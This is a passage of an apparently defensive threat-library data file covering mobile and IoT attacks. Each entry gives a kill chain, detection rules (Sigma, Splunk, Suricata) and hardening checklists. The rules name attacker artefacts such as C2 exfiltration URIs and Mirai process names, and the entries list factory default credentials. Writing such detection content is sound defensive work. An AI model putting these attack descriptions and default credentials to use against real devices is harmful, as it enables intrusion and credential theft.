        desc: "Posing as the victim to convince telecom support or retail store employees to port the number to a new SIM."
      },
      {
        step: 3,
        title: "SMS 2FA Interception & Account Hijacking",
        mitre: "T1111",
        desc: "Initiating password resets across corporate portals, intercepting SMS verification codes, and taking over accounts."
      }
    ],
    telemetry: {
      sources: [
        "Identity Provider Authentication Logs (Sudden password resets followed by SMS verification)",
        "Mobile Device Management (MDM) Carrier Network Disconnect Alerts",
        "Telecom Carrier Fraud Notification Webhooks"
      ],
      anomalies: [
        "Device abruptly losing cellular service and reporting 'No Service' while in a known coverage zone",
        "Rapid sequence of password resets across multiple critical enterprise accounts within minutes of SMS delivery",
        "Logon to corporate identity portals from a new IP/geolocation immediately following phone number re-registration"
      ]
    },
    rules: {
      sigma: `title: Account Password Reset via SMS Followed by IP Anomaly
id: 6d7e8f9a-0b1c-2d3e-4f5a-6b7c8d9e0f1a
status: production
description: Detects account password reset verified via SMS followed by logon from an uncharacteristic IP address.
logsource:
    product: okta
    service: security
detection:
    selection:
        eventType: 'user.account.reset_password'
        debugContext.debugData.factor: 'SMS'
    condition: selection
level: critical
tags:
    - attack.credential_access
    - attack.t1111`,
      splunk: `index=okta eventType="user.mfa.factor.deactivate" OR eventType="user.account.reset_password"
| stats count by target_user, src_ip
| eval Alert="CRITICAL: Password Reset with SMS Verification - Check for Potential SIM Swap"
| table _time, target_user, src_ip, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (
    msg:"SEC-ALERT Multiple Rapid Password Resets Across High-Privilege Accounts";
    threshold: type both, track by_src, count 5, seconds 60;
    classtype:attempted-admin;
    sid:1000055;
    rev:1;
)`,
      sysmon: `# Query MDM telemetry for sudden cellular SIM IMSI change events:
Get-MobileDeviceStatistics -Identity "Executive_Device"`
    },
    defenseChecklist: [
      { id: "sim_1", title: "Ban SMS-Based 2FA for Enterprise", tier: "Identity Architecture", desc: "Mandate phishing-resistant FIDO2 hardware keys or authenticator apps; prohibit SMS and voice-call verification." },
      { id: "sim_2", title: "Set Carrier Port-Out PINs", tier: "Telecom Security", desc: "Require all executive mobile accounts to have verbal passphrases and strict port-out freeze locks." },
      { id: "sim_3", title: "Monitor IMSI Discrepancies via MDM", tier: "MDM", desc: "Configure Enterprise MDM (Microsoft Intune, Jamf) to alert if a device SIM ICCID/IMSI changes unexpectedly." },
      { id: "sim_4", title: "Out-of-Band Executive Verification", tier: "Procedure", desc: "Require secondary managerial video verification before resetting administrative credentials for locked users." }
    ]
  },

  {
    num: 56,
    id: "mobile-phishing",
    name: "Mobile Phishing (Smishing)",
    shortName: "Mobile Phishing",
    moduleGroup: "mobile",
    module: "Mobile Attacks",
    category: "mobile",
    severity: "high",
    cvss: "7.8",
    mitre: "T1566.002",
    primaryTargets: "Smartphones, Corporate Mobile Users, WhatsApp/Signal Users",
    threatActors: "Initial Access Brokers, Ransomware Affiliates, Commercial Phishing Kits",
    summary: "Mobile Phishing (Smishing) leverages Short Message Service (SMS), RCS, or instant messaging platforms (WhatsApp, Signal, Telegram) to deliver deceptive lures to mobile device users. Smishing lures exploit the smaller screen size and limited URL inspection capabilities of mobile browsers, masquerading as delivery notifications, IT password expiration alerts, or payroll notices to harvest corporate SSO credentials or trick users into installing malicious configuration profiles.",
    killChain: [
      {
        step: 1,
        title: "Target Number Harvesting & Lure Design",
        mitre: "T1589",
        desc: "Harvesting employee phone numbers from corporate directories and crafting urgent IT-themed SMS messages."
      },
      {
        step: 2,
        title: "SMS Broadcast via Bulletproof Gateways",
        mitre: "T1566.002",
        desc: "Transmitting deceptive SMS messages containing shortened URLs pointing to mobile-optimized phishing pages."
      },
      {
        step: 3,
        title: "Credential Harvesting & Session Relay",
        mitre: "T1539",
        desc: "Victim enters credentials into mobile-formatted portal; attacker relays tokens to active session in real-time."
      }
    ],
    telemetry: {
      sources: [
        "Mobile Threat Defense (MTD) Client Logs (Lookout, Zimperium)",
        "Secure Web Gateway (SWG) Egress Filtering Logs",
        "Identity Provider Logon Telemetry (Mobile user agent anomalous sign-ins)"
      ],
      anomalies: [
        "Mobile browser navigating to newly registered domains (.xyz, .top, .live) directly from SMS messaging apps",
        "Sign-in from a mobile user agent originating from an ASN differing from the employee's carrier",
        "User installing an unvetted iOS configuration profile (.mobileconfig) or Android APK"
      ]
    },
    rules: {
      sigma: `title: Mobile User Agent Sign-in from Newly Registered Phishing Domain
id: 7e8f9a0b-1c2d-3e4f-5a6b-7c8d9e0f1a2b
status: production
description: Detects mobile device authenticating to an unvetted domain immediately following an SMS lure.
logsource:
    category: web_proxy
detection:
    selection:
        c-useragent|contains:
            - 'iPhone'
            - 'Android'
        cs-uri-stem|contains:
            - 'sso-verify'
            - 'it-servicedesk'
            - 'mfa-update'
    condition: selection
level: high
tags:
    - attack.initial_access
    - attack.t1566.002`,
      splunk: `index=proxy_logs (http_user_agent="*Android*" OR http_user_agent="*iPhone*") url="*.xyz*" OR url="*.top*"
| stats count by src_ip, url, user
| eval Alert="HIGH: Mobile Device Accessing High-Risk TLD Phishing URL"
| table _time, user, src_ip, url, count, Alert`,
      suricata: `alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"SEC-ALERT Mobile Smishing Landing Page Access";
    content:"/sso/login"; http_uri;
    content:"iPhone" nocase; http_header;
    classtype:web-application-attack;
    sid:1000056;
    rev:1;
)`,
      sysmon: `# Check mobile device DNS resolution queries in MTD logs
show mtd query logs --platform mobile`
    },
    defenseChecklist: [
      { id: "mphish_1", title: "Deploy Mobile Threat Defense (MTD)", tier: "Endpoint Security", desc: "Deploy MTD solutions (Zimperium, Lookout, Microsoft Defender for Mobile) to block malicious URLs at the OS level." },
      { id: "mphish_2", title: "Enforce WebAuthn / FIDO2", tier: "Identity", desc: "Enforce origin-bound FIDO2 authentication so credentials cannot be submitted to spoofed phishing hostnames." },
      { id: "mphish_3", title: "Block Side-Loading & Custom Profiles", tier: "MDM Policy", desc: "Lock down mobile devices via MDM to ban installation of untrusted iOS mobileconfig profiles and Android APKs." },
      { id: "mphish_4", title: "SMS Gateway Spam Filtering", tier: "Carrier", desc: "Coordinate with enterprise cellular providers to activate carrier-level anti-smishing filtering." }
    ]
  },

  {
    num: 57,
    id: "malicious-app",
    name: "Malicious Application Attack",
    shortName: "Malicious App Attack",
    moduleGroup: "mobile",
    module: "Mobile Attacks",
    category: "mobile",
    severity: "high",
    cvss: "8.4",
    mitre: "T1476",
    primaryTargets: "Android OS, iOS Devices, BYOD Enterprise Environments",
    threatActors: "Commercial Spyware Vendors, Criminal App Developers, APT Groups",
    summary: "A Malicious Application Attack involves deploying trojanized mobile applications disguised as legitimate utilities (PDF readers, QR scanners, battery savers, authenticators). Once installed (either via side-loading or bypassing app store vetting mechanisms), the app requests invasive permissions—such as the Android Accessibility Service, Notification Listener, or Device Administrator—to log keystrokes, capture screenshots, and harvest sensitive corporate data.",
    killChain: [
      {
        step: 1,
        title: "Deceptive App Packaging",
        mitre: "T1476",
        desc: "Embedding malicious payload inside a fully functional utility app published on third-party stores or Google Play."
      },
      {
        step: 2,
        title: "Privilege & Permission Coercion",
        mitre: "T1433",
        desc: "Tricking the user into granting Accessibility Service or Device Administrator rights under the guise of 'performance optimization'."
      },
      {
        step: 3,
        title: "Automated Data Exfiltration",
        mitre: "T1005",
        desc: "Abusing Accessibility APIs to scrape cleartext screen contents, read SMS verification codes, and send them to C2."
      }
    ],
    telemetry: {
      sources: [
        "MDM Application Inventory & Compliance Audits",
        "Mobile Threat Defense (MTD) Runtime Analysis Telemetry",
        "App Store Reputation Feeds"
      ],
      anomalies: [
        "Device installing applications originating from untrusted package installers (e.g. com.android.packageinstaller)",
        "Application requesting Accessibility Service permissions without legitimate accessibility justification",
        "Application communicating with unapproved external command-and-control IP ranges"
      ]
    },
    rules: {
      sigma: `title: Android Accessibility Service Abused by Non-System App
id: 8f9a0b1c-2d3e-4f5a-6b7c-8d9e0f1a2b3c
status: production
description: Detects an unvetted third-party application requesting and receiving Android Accessibility Service permissions.
logsource:
    category: mtd
detection:
    selection:
        permission: 'android.permission.BIND_ACCESSIBILITY_SERVICE'
        is_system_app: false
    condition: selection
level: high
tags:
    - attack.privilege_escalation
    - attack.t1476`,
      splunk: `index=mtd_logs alert_name="Malicious Application Detected" OR alert_name="Accessibility Abuse"
| stats count by device_id, app_name, package_name, risk_score
| where risk_score > 70
| eval Alert="CRITICAL: Malicious Application Installed on Enterprise Device"
| table _time, device_id, app_name, package_name, risk_score, Alert`,
      suricata: `alert tcp $HOME_NET any -> $EXTERNAL_NET any (
    msg:"SEC-ALERT Mobile Trojan Exfiltrating Device Telemetry to C2";
    content:"POST /api/v1/device/exfil"; http_uri;
    classtype:trojan-activity;
    sid:1000057;
    rev:1;
)`,
      sysmon: `# Query installed packages on managed Android device via ADB
adb shell pm list packages -3`
    },
    defenseChecklist: [
      { id: "mapp_1", title: "Enforce Application Whitelisting via MDM", tier: "MDM Policy", desc: "Mandate Managed Google Play / Apple VPP; completely block side-loading and third-party app installations." },
      { id: "mapp_2", title: "Restricted Permission Policies", tier: "OS Hardening", desc: "Block third-party applications from enabling Accessibility Services or Device Administrator roles." },
      { id: "mapp_3", title: "Deploy Mobile Threat Defense", tier: "Endpoint Security", desc: "Integrate continuous on-device app behavioral analysis to quarantine newly installed malware." },
      { id: "mapp_4", title: "Containerization & Work Profiles", tier: "Architecture", desc: "Deploy Android Enterprise Work Profiles or Apple User Enrollment to strictly separate corporate data from personal apps." }
    ]
  },

  {
    num: 58,
    id: "mobile-malware",
    name: "Mobile Malware Attack (Spyware & Bankers)",
    shortName: "Mobile Malware",
    moduleGroup: "mobile",
    module: "Mobile Attacks",
    category: "mobile",
    severity: "critical",
    cvss: "9.3",
    mitre: "T1476, T1433",
    primaryTargets: "Android & iOS Endpoints, Banking Apps, Encrypted Messaging (WhatsApp/Signal)",
    threatActors: "NSO Group (Pegasus), Cytrox (Predator), Godfather Banking Trojan Authors",
    summary: "Mobile Malware represents weaponized software engineered specifically to compromise mobile operating systems. Advanced spyware exploits zero-click kernel vulnerabilities (such as WebKit, BlastPass, or iMessage flaws) to achieve root privilege without user interaction, granting attackers silent access to microphone recording, live camera feeds, GPS location tracking, and decrypted chat messages directly from memory.",
    killChain: [
      {
        step: 1,
        title: "Zero-Click / One-Click Exploit Delivery",
        mitre: "T1203",
        desc: "Delivering a weaponized iMessage or WhatsApp packet containing an image parser buffer overflow."
      },
      {
        step: 2,
        title: "Kernel Privilege Escalation (Jailbreak/Root)",
        mitre: "T1068",
        desc: "Exploiting local kernel vulnerabilities to escape the OS sandbox and gain root execution privileges."
      },
      {
        step: 3,
        title: "Surveillance & Decrypted Signal Interception",
        mitre: "T1433",
        desc: "Extracting decrypted Signal/WhatsApp message databases directly from device flash memory and streaming to C2."
      }
    ],
    telemetry: {
      sources: [
        "Apple Sysdiagnose & MobileCrashReporter Telemetry",
        "Android Logcat (Kernel crash events and anomalous SELinux denials)",
        "Mobile Threat Defense (MTD) Jailbreak / Root Detection Sensors"
      ],
      anomalies: [
        "Unexplained high data egress over cellular connections when the device is idle or locked",
        "Rapid battery drain and thermal spikes accompanied by camera/microphone sensor activation",
        "Jailbreak or root indicators detected (unauthorized binaries in /system/bin or /private/var)"
      ]
    },
    rules: {
      sigma: `title: Mobile Device Jailbreak / Root Integrity Violation
id: 9a0b1c2d-3e4f-5a6b-7c8d-9e0f1a2b3c4d
status: production
description: Detects an enterprise mobile device exhibiting signs of kernel compromise, root, or jailbreak.
logsource:
    category: mtd
detection:
    selection:
        integrity_check: 'failed'
        reason:
            - 'Jailbreak Detected'
            - 'Root Status Confirmed'
            - 'SELinux Enforcing Disabled'
    condition: selection
level: critical
tags:
    - attack.defense_evasion
    - attack.t1476`,
      splunk: `index=mtd_logs event_name="OS Integrity Compromised" OR event_name="Root Detected"
| eval Alert="CRITICAL: Mobile Device Integrity Breached - Probable Advanced Spyware"
| table _time, device_id, platform, os_version, user_email, Alert`,
      suricata: `alert tcp $HOME_NET any -> $EXTERNAL_NET any (
    msg:"SEC-ALERT Mobile Spyware Known C2 Communication";
    flow:established,to_server;
    content:"POST /push/notify"; http_uri;
    classtype:trojan-activity;
    sid:1000058;
    rev:1;
)`,
      sysmon: `# Inspect iOS crash logs for evidence of sandbox escapes:
idevicesyslog | grep -i "kernel task sandbox"`
    },
    defenseChecklist: [
      { id: "mmal_1", title: "Enable iOS Lockdown Mode", tier: "OS Hardening", desc: "Mandate Apple Lockdown Mode for high-risk executives to disable complex web engines and message link parsing." },
      { id: "mmal_2", title: "Enforce Immediate OS Patching", tier: "Vulnerability Management", desc: "Automate MDM policies enforcing OS updates within 48 hours of security patch release to close zero-days." },
      { id: "mmal_3", title: "Conditional Access Compliance", tier: "Zero Trust", desc: "Block devices from accessing corporate email and cloud assets if MTD reports root or jailbreak status." },
      { id: "mmal_4", title: "Regular Device Reboot Policy", tier: "Operations", desc: "Enforce scheduled daily mobile device reboots to flush non-persistent in-memory exploit chains." }
    ]
  },

  {
    num: 59,
    id: "overlay-attack",
    name: "Overlay Attack",
    shortName: "Overlay Attack",
    moduleGroup: "mobile",
    module: "Mobile Attacks",
    category: "mobile",
    severity: "high",
    cvss: "8.2",
    mitre: "T1411",
    primaryTargets: "Android Banking Apps, Cryptocurrency Wallets, Corporate SSO Portals",
    threatActors: "Banking Trojan Gangs (SharkBot, Anatsa, TeaBot), Credential Harvesters",
    summary: "An Overlay Attack is an Android-specific malware technique where an attacker application monitors running tasks in the background. When the user launches a targeted high-value application (such as a corporate banking or SSO portal), the malware instantly draws a pixel-perfect, fake web view or overlay window directly on top of the legitimate app using SYSTEM_ALERT_WINDOW permissions, capturing entered passwords, PINs, and credit card numbers.",
    killChain: [
      {
        step: 1,
        title: "Foreground Process Monitoring",
        mitre: "T1057",
        desc: "Malware polls running tasks using Accessibility Services to detect when the victim launches a banking app."
      },
      {
        step: 2,
        title: "Targeted Fake Window Injection",
        mitre: "T1411",
        desc: "Instantly launching a full-screen transparent or counterfeit activity matching the target application UI."
      },
      {
        step: 3,
        title: "Input Interception & Pass-Through",
        mitre: "T1056",
        desc: "Recording victim credentials, forwarding them to the C2 server, and closing the overlay to prevent suspicion."
      }
    ],
    telemetry: {
      sources: [
        "Android App Security Telemetry (FLAG_SECURE violation logs)",
        "Mobile Threat Defense (MTD) Overlay Detection Events",
        "Banking Application Fraud Management Logs"
      ],
      anomalies: [
        "Application requesting 'Draw over other apps' (SYSTEM_ALERT_WINDOW) without functional requirement",
        "Rapid window transition events occurring immediately upon opening target corporate applications",
        "Detection of an active touch-event hijacking filter on top of the current screen"
      ]
    },
    rules: {
      sigma: `title: Android Overlay Window Hijacking Detected
id: 0a1b2c3d-4e5f-6a7b-8c9d-0e1f2a3b4c5d
status: production
description: Detects suspicious background applications invoking SYSTEM_ALERT_WINDOW to draw over foreground tasks.
logsource:
    category: mtd
detection:
    selection:
        event_type: 'overlay_window_detected'
        target_package|contains:
            - 'com.bank'
            - 'com.corporate.sso'
    condition: selection
level: high
tags:
    - attack.credential_access
    - attack.t1411`,
      splunk: `index=mtd_logs alert_name="Overlay Detected" OR alert_name="Window Injection"
| stats count by device_id, malicious_package, targeted_package
| eval Alert="HIGH: Overlay Window Attack Intercepting Banking or SSO Credentials"
| table _time, device_id, malicious_package, targeted_package, Alert`,
      suricata: `alert tcp $HOME_NET any -> $EXTERNAL_NET any (
    msg:"SEC-ALERT Banking Overlay Credential Harvesting Payload Transmitted";
    content:"POST /gate.php"; http_uri;
    content:"bank_user="; nocase;
    classtype:trojan-activity;
    sid:1000059;
    rev:1;
)`,
      sysmon: `# Inspect packages with active overlay permissions:
dumpsys window displays | grep -i "Window #" `
    },
    defenseChecklist: [
      { id: "ovl_1", title: "Enforce FLAG_SECURE in App Code", tier: "Application Development", desc: "Develop corporate mobile applications with FLAG_SECURE and filterTouchesWhenObscured to block overlay windows." },
      { id: "ovl_2", title: "Block 'Display Over Other Apps' via MDM", tier: "MDM Policy", desc: "Configure MDM to disable SYSTEM_ALERT_WINDOW permissions across non-whitelisted applications." },
      { id: "ovl_3", title: "Deploy Biometric-Only Authentication", tier: "Authentication", desc: "Utilize Android BiometricPrompt APIs which are handled directly by the secure hardware enclave and immune to overlays." },
      { id: "ovl_4", title: "Target App Upgrade to Modern Android", tier: "OS Level", desc: "Target Android 12+ where overlay permissions and background task inspection are heavily restricted." }
    ]
  },

  // =========================================================================
  // MODULE 8: IOT ATTACKS (60 - 64)
  // =========================================================================
  {
    num: 60,
    id: "iot-botnet",
    name: "IoT Botnet Attack",
    shortName: "IoT Botnet Attack",
    moduleGroup: "iot",
    module: "IoT Attacks",
    category: "iot",
    severity: "critical",
    cvss: "9.8",
    mitre: "T1498, T1584.005",
    primaryTargets: "Smart Cameras, Digital Video Recorders (DVRs), Edge Routers, Embedded Devices",
    threatActors: "Mirai Botnet Operators, Mozi, Dark.IoT, Nation-State Proxies",
    summary: "An IoT Botnet Attack involves the automated scanning, exploitation, and enslavement of tens of thousands of Internet-of-Things (IoT) devices across the global Internet. Botnet malware (such as Mirai, Mozi, or Gafgyt) targets devices running busybox Linux with exposed Telnet/SSH ports or known remote code execution vulnerabilities, turning them into remotely controlled zombie nodes to launch terabit-scale DDoS floods.",
    killChain: [
      {
        step: 1,
        title: "Automated Global Port Scanning",
        mitre: "T1595.001",
        desc: "Scanning global IPv4 space on ports 23, 2323, 80, and 8080 targeting common embedded IoT web servers."
      },
      {
        step: 2,
        title: "Automated Credential Brute-Force or 1-Day Exploit",
        mitre: "T1078.001",
        desc: "Executing automated dictionary attacks using 60+ known factory default passwords or known RCE exploits."
      },
      {
        step: 3,
        title: "Dropper Download & C2 Synchronization",
        mitre: "T1584.005",
        desc: "Downloading architecture-specific malware ELF binary (ARM, MIPS, x86) and registering with the botnet C2 network."
      }
    ],
    telemetry: {
      sources: [
        "Network Boundary NetFlow / IPFIX (Abnormal outbound SYN scan volume)",
        "IoT Gateway Firewall Logs (Outbound connections on IRC or non-standard C2 ports)",
        "Device System Metrics (CPU pegged at 100%, sudden process crash of management daemons)"
      ],
      anomalies: [
        "Embedded camera or printer transmitting thousands of outbound TCP packets per second to external IP addresses",
        "IoT device establishing outbound IRC or custom binary socket connections",
        "Processes with names like 'mirai', 'dvrHelper', or random alphanumeric strings running in /tmp or /dev/shm"
      ]
    },
    rules: {
      sigma: `title: IoT Device Initiating High-Volume Outbound Port Scanning
id: 1b2c3d4e-5f6a-7b8c-9d0e-1f2a3b4c5d6e
status: production
description: Detects an internal IoT device generating thousands of outbound connection attempts to distinct external IPs.
logsource:
    category: firewall
detection:
    selection:
        SourceSubnet: '192.168.100.0/24' # IoT VLAN
        action: 'allowed'
    timeframe: 1m
    condition: selection | count(DestinationIp) > 200
level: critical
tags:
    - attack.impact
    - attack.t1498`,
      splunk: `index=firewall src_ip="192.168.100.*"
| stats dc(dest_ip) as target_ips dc(dest_port) as target_ports count by src_ip
| where target_ips > 100
| eval Alert="CRITICAL: IoT Device Exhibiting Botnet Scanning / Propagation Activity"
| table _time, src_ip, target_ips, target_ports, count, Alert`,
      suricata: `alert tcp $HOME_NET any -> $EXTERNAL_NET [23,2323] (
    msg:"SEC-ALERT IoT Botnet Outbound Telnet Scanning (Mirai Propagation)";
    flags:S;
    threshold: type both, track by_src, count 50, seconds 5;
    classtype:trojan-activity;
    sid:1000060;
    rev:1;
)`,
      sysmon: `# Linux busybox check for suspicious running processes in memory:
ps | grep -iE "(mirai|bot|dvrHelper|tmp)"`
    },
    defenseChecklist: [
      { id: "ibot_1", title: "Complete IoT Network Isolation", tier: "Network Architecture", desc: "Segregate all IoT devices onto dedicated VLANs with strict firewall rules blocking all direct inbound/outbound Internet access." },
      { id: "ibot_2", title: "Disable Unnecessary Services (Telnet/SSH)", tier: "Device Hardening", desc: "Turn off Telnet, unencrypted HTTP, and UPnP on all IoT appliances across the enterprise estate." },
      { id: "ibot_3", title: "Change Factory Default Credentials", tier: "Identity", desc: "Mandate unique, complex passwords for all installed cameras, sensors, and appliances before deployment." },
      { id: "ibot_4", title: "Regular Firmware Auditing", tier: "Vulnerability Management", desc: "Maintain centralized inventory of all IoT devices and patch known CVEs immediately." }
    ]
  },

  {
    num: 61,
    id: "firmware-exploitation",
    name: "Firmware Exploitation",
    shortName: "Firmware Exploitation",
    moduleGroup: "iot",
    module: "IoT Attacks",
    category: "iot",
    severity: "critical",
    cvss: "9.4",
    mitre: "T1542.001",
    primaryTargets: "Embedded Hardware, SCADA/ICS Controllers, Network Gateways, Smart Meters",
    threatActors: "Nation-State APTs (Volt Typhoon, Sandworm), Hardware Reverse Engineers",
    summary: "Firmware Exploitation involves reverse engineering and tampering with the low-level operating system and boot code flashed into an IoT device's non-volatile ROM/Flash memory. Adversaries unpack firmware images using tools like Binwalk to discover hardcoded cryptographic private keys, hardcoded backdoor accounts, and unpatched binary vulnerabilities, or flash trojanized firmware to establish permanent hardware-level persistence.",
    killChain: [
      {
        step: 1,
        title: "Firmware Extraction & Unpacking",
        mitre: "T1542.001",
        desc: "Extracting binary image via vendor download or physical SPI/UART flash chip dumping using Binwalk."
      },
      {
        step: 2,
        title: "Static Reverse Engineering & Vulnerability Discovery",
        mitre: "T1083",
        desc: "Analyzing embedded root filesystems (SquashFS) in Ghidra to uncover hardcoded root passwords and buffer overflows."
      },
      {
        step: 3,
        title: "Malicious Firmware Flashing & Persistence",
        mitre: "T1542.001",
        desc: "Overwriting device flash memory with a modified binary containing a persistent backdoor surviving factory resets."
      }
    ],
    telemetry: {
      sources: [
        "Hardware Bootloader TPM Measured Boot Logs",
        "Firmware Integrity Hash Verification Alerts",
        "IoT Central Management Portal Update Logs"
      ],
      anomalies: [
        "Cryptographic hash mismatch between running firmware and vendor published release hash",
        "Unexpected modifications to /etc/shadow or /etc/passwd discovered inside device filesystem",
        "Firmware update initiated from an unapproved IP address without cryptographic signature validation"
      ]
    },
    rules: {
      sigma: `title: Unauthorized IoT Firmware Update / Flashing Event
id: 2c3d4e5f-6a7b-8c9d-0e1f-2a3b4c5d6e7f
status: production
description: Detects firmware update requests initiated from unauthorized external IP addresses.
logsource:
    category: webserver
detection:
    selection:
        cs-uri-stem|contains:
            - '/firmware_upload'
            - '/upgrade.cgi'
            - '/api/system/firmware'
        cs-method: 'POST'
    condition: selection
level: critical
tags:
    - attack.persistence
    - attack.t1542.001`,
      splunk: `index=iot_logs action="firmware_update" status="success"
| lookup approved_firmware_hashes hash OUTPUT valid_release
| where isnull(valid_release)
| eval Alert="CRITICAL: Unrecognized Firmware Hash Flashed to Device"
| table _time, device_id, model, hash, Alert`,
      suricata: `alert http $EXTERNAL_NET any -> $HOME_NET any (
    msg:"SEC-ALERT Unsigned IoT Firmware Upload in Progress";
    content:"POST"; http_method;
    content:"multipart/form-data"; http_header;
    content:"firmware.bin"; nocase;
    classtype:attempted-admin;
    sid:1000061;
    rev:1;
)`,
      sysmon: `# Verify cryptographic hash of extracted firmware binary:
sha256sum /dev/mtdblock0`
    },
    defenseChecklist: [
      { id: "ifw_1", title: "Cryptographic Firmware Signing", tier: "Hardware Architecture", desc: "Enforce hardware root-of-trust with cryptographic signature validation before bootloaders execute updated firmware images." },
      { id: "ifw_2", title: "Disable Physical Debug Ports (JTAG/UART)", tier: "Physical Security", desc: "Physically disable or blow fuses on JTAG and serial UART headers on production PCB boards." },
      { id: "ifw_3", title: "Static Firmware Analysis (SAST)", tier: "Supply Chain", desc: "Perform automated security scans of firmware images before procurement to verify absence of hardcoded credentials." },
      { id: "ifw_4", title: "Read-Only Root Filesystem", tier: "OS Hardening", desc: "Mount the system partition as read-only (CramFS/SquashFS) to prevent runtime malware modification." }
    ]
  },

  {
    num: 62,
    id: "default-password",
    name: "Default-Password Attack",
    shortName: "Default-Password Attack",
    moduleGroup: "iot",
    module: "IoT Attacks",
    category: "iot",
    severity: "high",
    cvss: "8.8",
    mitre: "T1078.001",
    primaryTargets: "IP Cameras, Embedded Routers, Industrial Sensors, Network Printers",
    threatActors: "Automated Internet Scanners, Mirai Variants, Script Kiddies",
    summary: "Default-Password attacks exploit the pervasive reality that many IoT and embedded network devices are shipped from factories with generic, publicly documented default credentials (e.g., 'admin:admin', 'root:12345', 'support:support'). Attackers run automated mass scanners across public IP ranges or internal subnets, instantly compromising devices where administrators failed to change the initial factory credentials.",
    killChain: [
      {
        step: 1,
        title: "Default Credential Table Compilation",
        mitre: "T1589",
        desc: "Compiling a dictionary of factory default usernames and passwords published in manufacturer manuals."
      },
      {
        step: 2,
        title: "Automated Device Sweep",
        mitre: "T1110.001",
        desc: "Scripting automated HTTP, Telnet, or SSH login attempts against discovered IoT IP addresses."
      },
      {
        step: 3,
        title: "Instant Administrative Compromise",
        mitre: "T1078.001",
        desc: "Gaining full administrative privileges upon the first credential match, enabling configuration changes or payload deployment."
      }
    ],
    telemetry: {
      sources: [
        "IoT Device Authentication Logs (Repeated successful logins with factory usernames: root, admin, operator)",
        "Internal Network Vulnerability Scanner Reports",
        "Edge Firewall Access Logs"
      ],
      anomalies: [
        "New device deployed on enterprise network immediately receiving external connections on default ports",
        "Administrative login successful using common default passwords on critical network infrastructure",
        "Multiple IoT appliances sharing identical cryptographic hashes in their configuration backups"
      ]
    },
    rules: {
      sigma: `title: IoT Authentication with Known Default Credential
id: 3d4e5f6a-7b8c-9d0e-1f2a-3b4c5d6e7f8a
status: production
description: Detects authentication attempts utilizing common factory default usernames and passwords on IoT web consoles.
logsource:
    category: webserver
detection:
    selection:
        cs-method: 'POST'
        cs-uri-stem|contains:
            - '/login'
            - '/auth'
            - '/setup.cgi'
    condition: selection
level: high
tags:
    - attack.credential_access
    - attack.t1078.001`,
      splunk: `index=iot_logs action="login_success" user IN ("admin", "root", "default", "support")
| stats count by src_ip, user, device_model
| eval Alert="WARNING: Successful Login Using Standard Default Username on IoT Device"
| table _time, src_ip, user, device_model, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HOME_NET [23,80] (
    msg:"SEC-ALERT Known Factory Default Password Authentication Match";
    content:"admin"; nocase; content:"admin"; nocase;
    classtype:bad-unknown;
    sid:1000062;
    rev:1;
)`,
      sysmon: `# Query internal vulnerability scan logs for default credential vulnerabilities
grep -i "default password found" /var/log/openvas/reports.log`
    },
    defenseChecklist: [
      { id: "idef_1", title: "Mandatory First-Boot Password Change", tier: "Device Hardening", desc: "Procure only IoT devices that enforce a mandatory custom password creation wizard before enabling network communications." },
      { id: "idef_2", title: "Automated Credential Vaulting (PAM)", tier: "Identity", desc: "Integrate all IoT devices into enterprise Privileged Access Management (CyberArk, HashiCorp Vault) to randomize passwords." },
      { id: "idef_3", title: "Automated Configuration Audits", tier: "Vulnerability Management", desc: "Run scheduled automated vulnerability scans targeting IoT subnets to flag active default passwords." },
      { id: "idef_4", title: "Perimeter Ingress Block", tier: "Firewall", desc: "Strictly block inbound public Internet traffic to IoT management interfaces." }
    ]
  },

  {
    num: 63,
    id: "iot-mitm",
    name: "IoT Man-in-the-Middle Attack",
    shortName: "IoT MITM Attack",
    moduleGroup: "iot",
    module: "IoT Attacks",
    category: "iot",
    severity: "high",
    cvss: "8.5",
    mitre: "T1557",
    primaryTargets: "Smart City Sensors, Building Automation Systems, SCADA Fieldbuses, MQTT Brokers",
    threatActors: "Industrial Espionage Groups, Extortionists, Hacktivists",
    summary: "An IoT Man-in-the-Middle (MitM) Attack targets communication channels connecting IoT field devices to edge gateways or cloud management platforms. Because many IoT deployments utilize lightweight, unencrypted protocols (such as cleartext MQTT, CoAP, Modbus, or Zigbee without pre-shared keys), an on-path attacker intercepts, tampers with, or injects falsified telemetry readings (e.g. spoofing temperature sensors or water valve states).",
    killChain: [
      {
        step: 1,
        title: "On-Path Network Insertion",
        mitre: "T1557.002",
        desc: "Positioning between IoT devices and cloud gateway via ARP poisoning or rogue wireless repeater."
      },
      {
        step: 2,
        title: "Protocol Telemetry Interception",
        mitre: "T1040",
        desc: "Capturing cleartext MQTT topic publications, CoAP requests, or Modbus register reads."
      },
      {
        step: 3,
        title: "Payload Manipulation & Rogue Command Injection",
        mitre: "T1565.001",
        desc: "Tampering with sensor data packets in transit to report normal operation while issuing shutdown commands to physical actuators."
      }
    ],
    telemetry: {
      sources: [
        "Industrial Network IDS (Nozomi, Claroty, Suricata OT rules)",
        "MQTT Broker Authentication & Protocol Violation Logs",
        "Physical Sensor Value Anomaly Telemetry"
      ],
      anomalies: [
        "Sudden discrepancy between physical process status and sensor telemetry reports",
        "MQTT packets published with invalid client IDs or unsigned JSON payloads",
        "Transmission of unencrypted IoT protocols across public or unsegmented networks"
      ]
    },
    rules: {
      sigma: `title: Unencrypted Cleartext MQTT / CoAP Telemetry Detected
id: 4e5f6a7b-8c9d-0e1f-2a3b-4c5d6e7f8a9b
status: production
description: Detects unencrypted IoT messaging protocols susceptible to Man-in-the-Middle interception.
logsource:
    category: network_connection
detection:
    selection:
        DestinationPort:
            - 1883 # MQTT cleartext
            - 5683 # CoAP cleartext
            - 502  # Modbus TCP
    condition: selection
level: high
tags:
    - attack.credential_access
    - attack.t1557`,
      splunk: `index=ot_network dest_port=1883 OR dest_port=502
| stats count by src_ip, dest_ip, dest_port
| eval Alert="HIGH: Cleartext OT/IoT Protocol Active - MitM Vulnerability"
| table _time, src_ip, dest_ip, dest_port, count, Alert`,
      suricata: `alert tcp any 1883 -> any any (
    msg:"SEC-ALERT Unencrypted MQTT Publish Message Observed (MitM Risk)";
    content:"|30|"; depth:1; # MQTT Publish packet
    classtype:policy-violation;
    sid:1000063;
    rev:1;
)`,
      sysmon: `# Inspect network connections on IoT gateway:
netstat -tulpn | grep -iE "(mqtt|coap|modbus)"`
    },
    defenseChecklist: [
